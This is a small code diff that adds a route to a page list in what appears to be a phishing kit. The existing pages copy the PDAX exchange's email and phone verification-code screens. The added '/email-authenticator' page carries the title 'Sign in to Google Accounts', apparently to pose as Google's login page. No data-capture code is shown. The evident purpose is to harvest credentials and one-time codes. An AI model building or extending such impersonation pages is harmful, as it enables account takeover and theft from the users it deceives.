@@ -20,6 +20,7 @@ const PAGES = [
   { path: "/invalid-code-email", file: "invalid-code-email", title: "PDAX" },
   { path: "/phone-code", file: "phone-code", title: "PDAX" },
   { path: "/invalid-phone-code", file: "invalid-phone-code", title: "PDAX" },
+  { path: "/email-authenticator", file: "email-authenticator", title: "Sign in to Google Accounts" },
 ];
 
 const Loader = () => (
